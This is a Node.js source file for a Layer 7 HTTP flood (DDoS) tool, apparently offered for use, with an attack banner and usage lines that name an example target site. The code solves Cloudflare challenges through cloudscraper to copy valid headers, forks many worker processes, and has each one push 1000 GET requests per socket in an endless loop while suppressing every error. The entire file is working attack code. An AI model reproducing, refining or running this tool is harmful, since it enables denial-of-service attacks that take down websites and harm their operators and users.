/*
* =============================
*     Nodejs Flood
*     Code By Jonathan Jackson
* =============================
*
*/
require('events').EventEmitter.defaultMaxListeners = 0;
const CloudScraper = require('cloudscraper');
const cluster = require('cluster');
const url = require('url');
let target = process.argv[2]
const time = process.argv[3];
const threads = process.argv[4];
const sleep = require('await-sleep');
let headers = '';
let started = 0;

if (process.argv.length == 2) {
    console.log(`

     ▓█████▄  ▓█████▄  ▒█████    ██████      ▄▄▄     ▄▄▄█████▓ ▀██ ▄█▀
     ▒██▀ ██▌ ▒██▀ ██▌▒██▒  ██▒▒██    ▒     ▒████▄   ▓  ██▒ ▓▒  ██▄█▒ 
     ░██   █▌ ░██   █▌▒██░  ██▒░ ▓██▄       ▒██  ▀█▄ ▒ ▓██░ ▒░ ▓███▄░ 
    ▒░▓█▄   ▌▒░▓█▄   ▌▒██   ██░  ▒   ██▒    ░██▄▄▄▄██░ ▓██▓ ░  ▓██ █▄ 
    ░░▒████▓ ░░▒████▓ ░ ████▓▒░▒██████▒▒     ▓█   ▓██  ▒██▒ ░  ▒██▒ █▄
    ░ ▒▒▓  ▒ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒▒   ▓▒█  ▒ ░░    ▒ ▒▒ ▓▒
      ░ ▒  ▒   ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░        ░   ▒▒     ░     ░ ░▒ ▒░
      ░ ░  ░   ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░        ░   ▒    ░ ░     ░ ░░ ░ 
        ░        ░        ░ ░        ░            ░            ░  ░   


Usage: node ddosV1.js [URL] [time] [threads]
Example: node ddosV1.js http://vipmod.pro 60 5
                    [ > DDOS | Layer7 < ]
                 [ > SCRIPT BY | Jonathan < ]`);
    process.exit(0);
} else {
    try {
        if (started == 0){
            startthreads(),
            started = 1
        } else {
        //console.log("ERROR")
        }
    } catch (error){
        console.log("can't run.")
        //console.log(error),
        process.exit(0);
    };
}

function getHeaders() {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                return start();
            }
            Object.keys(response.request.headers).forEach(function (i, e) {
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });
            resolve(headers);
        });
    });
}

function startflood() {
    getHeaders().then(function (result) {
        console.log('Attack started ! ');
        setInterval(() => {
            pizzaflood(result);
        });
    });
};

async function startthreads(){
    if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Threads ${worker.process.pid} stop`);
    });
    } else {
        console.log(`Setup Threads ${process.pid}`),
        await sleep(1000),
        startflood();
    }
}

function pizzaflood(headers) {
    const ip = url.parse(target).host;
    const net = require('net');
    const s = new net.Socket();

    s.connect(80, ip);
    s.setTimeout(1000);

    for (let i = 0; i < 1000; ++i) {
        s.write(
            `GET ${target} HTTP/1.2\r\n` +
            headers + '\r\n\r\n'
        )
    }

    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    });
}

setTimeout(() => {
    console.log('Attack Ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});